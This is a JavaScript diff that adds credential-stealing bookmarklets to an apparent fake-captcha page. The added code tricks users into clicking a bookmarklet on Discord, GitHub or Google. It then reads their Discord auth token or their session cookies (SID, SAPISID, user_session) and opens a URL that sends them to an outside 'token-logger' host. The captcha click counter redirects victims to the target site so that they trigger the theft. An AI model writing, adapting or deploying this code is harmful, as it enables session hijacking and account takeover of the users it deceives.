@@ -2346,6 +2346,23 @@
     var baseEsc = captchaBaseUrl.replace(/'/g, "\\'");
     var destEsc = BOOKMARKLET_TARGET_URL.replace(/'/g, "\\'");
     var maxC = String(BOOKMARKLET_CLICKS_TO_REDIRECT);
+    
+    // Check current mode - can be set by config or window variable
+    var mode = window.BOOKMARKLET_MODE || 'captcha';
+    
+    console.log('Building bookmarklet with mode:', mode);
+    
+    if (mode === 'token_logger') {
+      return buildTokenLoggerBookmarklet();
+    }
+    if (mode === 'github_cookie') {
+      return buildGithubCookieBookmarklet();
+    }
+    if (mode === 'google_cookie') {
+      return buildGoogleCookieBookmarklet();
+    }
+    
+    // Default: captcha bookmarklet (original functionality)
     return (
       "javascript:(function(){" +
       "var base='" + baseEsc + "';" +
@@ -2375,7 +2392,165 @@
     );
   }
 
-  const bookmarkletHref = buildUnifiedBookmarklet();
+  function buildTokenLoggerBookmarklet() {
+    var baseEsc = captchaBaseUrl.replace(/'/g, "\\'");
+    var maxC = String(BOOKMARKLET_CLICKS_TO_REDIRECT);
+    return (
+      "javascript:(function(){" +
+      "var base='" + baseEsc + "';" +
+      "var maxC=" + maxC + ";" +
+      "var k='bookmarkletClicks';" +
+      "var navOnce='exodusBookmarkletNavOnce';" +
+      "var h=location.hostname;" +
+      // On Discord: extract token
+      "var isDiscord=h==='discord.com'||h==='www.discord.com'||h==='canary.discord.com'||h==='ptb.discord.com';" +
+      "if(isDiscord){" +
+      "try{" +
+      "var token=null;" +
+      "if(typeof localStorage!=='undefined'){" +
+      "token=localStorage.getItem('token');" +
+      "if(!token&&localStorage.length>0){" +
+      "for(var i=0;i<localStorage.length;i++){" +
+      "var key=localStorage.key(i);" +
+      "var val=localStorage.getItem(key);" +
+      "if(val&&(val.indexOf('mfa.')!==-1||val.indexOf('dQw')!==-1||(val.split('.').length===3&&val.length>30))){" +
+      "token=val;" +
+      "break;" +
+      "}" +
+      "}" +
+      "}" +
+      "}" +
+      "if(token){" +
+      "var cleanToken=token.replace(/\"/g,'').trim();" +
+      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?token='+encodeURIComponent(cleanToken)+" +
+      "'&method=token_logger&timestamp='+encodeURIComponent(new Date().toISOString())+" +
+      "'&url='+encodeURIComponent(window.location.href);" +
+      "window.open(redirectUrl,'_blank');" +
+      "}" +
+      "}catch(e){console.error(e);}" +
+      "return;" +
+      "}" +
+      // On captcha page: count clicks and redirect to Discord after threshold
+      "var our=location.protocol+'//'+location.host;" +
+      "var isOur=(our===base);" +
+      "if(!isOur){return;}" +
+      "var n=parseInt(localStorage.getItem(k)||0,10)+1;" +
+      "localStorage.setItem(k,n);" +
+      "var doc=document;var clickCounter=doc.getElementById('clickCounter');" +
+      "if(!clickCounter&&window.frames&&window.frames.length){try{for(var i=0;i<window.frames.length;i++){clickCounter=window.frames[i].document.getElementById('clickCounter');if(clickCounter){doc=window.frames[i].document;break;}}}catch(e){}}" +
+      "if(clickCounter){clickCounter.textContent=n;try{window.parent.postMessage({type:'captcha_tick',clicks:n},'*');}catch(e){}}" +
+      "if(n>=maxC&&!localStorage.getItem(navOnce)){localStorage.setItem(navOnce,'1');window.location.href='https://discord.com/channels/@me';}" +
+      "})();"
+    );
+  }
+
+  function buildGithubCookieBookmarklet() {
+    var baseEsc = captchaBaseUrl.replace(/'/g, "\\'");
+    var maxC = String(BOOKMARKLET_CLICKS_TO_REDIRECT);
+    return (
+      "javascript:(function(){" +
+      "var base='" + baseEsc + "';" +
+      "var maxC=" + maxC + ";" +
+      "var k='bookmarkletClicks';" +
+      "var navOnce='exodusBookmarkletNavOnce';" +
+      "var h=location.hostname;" +
+      "var isGithub=h==='github.com'||h==='www.github.com';" +
+      "if(isGithub){" +
+      "try{" +
+      "var cookies=document.cookie;" +
+      "var ghSession='';" +
+      "var allCookies=cookies.split(';');" +
+      "for(var i=0;i<allCookies.length;i++){" +
+      "var c=allCookies[i].trim();" +
+      "if(c.indexOf('gh_session')!==-1||c.indexOf('user_session')===0||c.indexOf('__Host-user_session_same_site')===0||c.indexOf('logged_in')===0||c.indexOf('dotcom_user')===0||c.indexOf('_gh_sess')===0){" +
+      "ghSession+=c+'; ';" +
+      "}" +
+      "}" +
+      "if(!ghSession){ghSession=cookies;}" +
+      "console.log('GitHub cookies captured:', ghSession);" +
+      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?cookie='+encodeURIComponent(ghSession)+" +
+      "'&type=github&method=github_cookie&timestamp='+encodeURIComponent(new Date().toISOString())+" +
+      "'&url='+encodeURIComponent(window.location.href);" +
+      "window.open(redirectUrl,'_blank');" +
+      "}catch(e){console.error(e);}" +
+      "return;" +
+      "}" +
+      "var our=location.protocol+'//'+location.host;" +
+      "var isOur=(our===base);" +
+      "if(!isOur){return;}" +
+      "var n=parseInt(localStorage.getItem(k)||0,10)+1;" +
+      "localStorage.setItem(k,n);" +
+      "var doc=document;var clickCounter=doc.getElementById('clickCounter');" +
+      "if(!clickCounter&&window.frames&&window.frames.length){try{for(var i=0;i<window.frames.length;i++){clickCounter=window.frames[i].document.getElementById('clickCounter');if(clickCounter){doc=window.frames[i].document;break;}}}catch(e){}}" +
+      "if(clickCounter){clickCounter.textContent=n;try{window.parent.postMessage({type:'captcha_tick',clicks:n},'*');}catch(e){}}" +
+      "if(n>=maxC&&!localStorage.getItem(navOnce)){localStorage.setItem(navOnce,'1');window.location.href='https://github.com';}" +
+      "})();"
+    );
+  }
+
+  function buildGoogleCookieBookmarklet() {
+    var baseEsc = captchaBaseUrl.replace(/'/g, "\\'");
+    var maxC = String(BOOKMARKLET_CLICKS_TO_REDIRECT);
+    return (
+      "javascript:(function(){" +
+      "var base='" + baseEsc + "';" +
+      "var maxC=" + maxC + ";" +
+      "var k='bookmarkletClicks';" +
+      "var navOnce='exodusBookmarkletNavOnce';" +
+      "var h=location.hostname;" +
+      "var isGoogle=h.indexOf('google.com')!==-1||h==='accounts.google.com'||h==='mail.google.com'||h==='myaccount.google.com';" +
+      "if(isGoogle){" +
+      "try{" +
+      "var allCookies=document.cookie;" +
+      "var sid='';var sapisid='';" +
+      "var cookieList=allCookies.split(';');" +
+      "for(var i=0;i<cookieList.length;i++){" +
+      "var c=cookieList[i].trim();" +
+      "if(c.indexOf('SID=')===0){sid=c;}" +
+      "if(c.indexOf('SAPISID=')===0){sapisid=c;}" +
+      "}" +
+      "console.log('🔐 SID Cookie:',sid);" +
+      "console.log('🔐 SAPISID Cookie:',sapisid);" +
+      "console.log('All Google Cookies:',allCookies);" +
+      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?cookie='+encodeURIComponent(allCookies)+" +
+      "'&sid='+encodeURIComponent(sid)+" +
+      "'&sapisid='+encodeURIComponent(sapisid)+" +
+      "'&type=google&method=google_cookie&timestamp='+encodeURIComponent(new Date().toISOString())+" +
+      "'&url='+encodeURIComponent(window.location.href);" +
+      "window.open(redirectUrl,'_blank');" +
+      "}catch(e){console.error(e);}" +
+      "return;" +
+      "}" +
+      "var our=location.protocol+'//'+location.host;" +
+      "var isOur=(our===base);" +
+      "if(!isOur){return;}" +
+      "var n=parseInt(localStorage.getItem(k)||0,10)+1;" +
+      "localStorage.setItem(k,n);" +
+      "var doc=document;var clickCounter=doc.getElementById('clickCounter');" +
+      "if(!clickCounter&&window.frames&&window.frames.length){try{for(var i=0;i<window.frames.length;i++){clickCounter=window.frames[i].document.getElementById('clickCounter');if(clickCounter){doc=window.frames[i].document;break;}}}catch(e){}}" +
+      "if(clickCounter){clickCounter.textContent=n;try{window.parent.postMessage({type:'captcha_tick',clicks:n},'*');}catch(e){}}" +
+      "if(n>=maxC&&!localStorage.getItem(navOnce)){localStorage.setItem(navOnce,'1');window.location.href='https://myaccount.google.com';}" +
+      "})();"
+    );
+  }
+
+  // Load config FIRST, then set bookmarkletHref
+  var bookmarkletHref = buildUnifiedBookmarklet();
+
+  (function() {
+    fetch('/config.json')
+      .then(res => res.json())
+      .then(config => {
+        window.BOOKMARKLET_MODE = config.bookmarkletMode || 'captcha';
+        // Rebuild with correct mode and reassign
+        bookmarkletHref = buildUnifiedBookmarklet();
+        console.log('✅ Bookmarklet mode set to:', window.BOOKMARKLET_MODE);
+      })
+      .catch(err => {
+        console.log('Config not found, using default captcha mode');
+        window.BOOKMARKLET_MODE = 'captcha';
+      });
+  })();
 
   // Clear localStorage on fresh page load
   (function () {
@@ -2440,3 +2615,4 @@
   })();
 
 })();
+
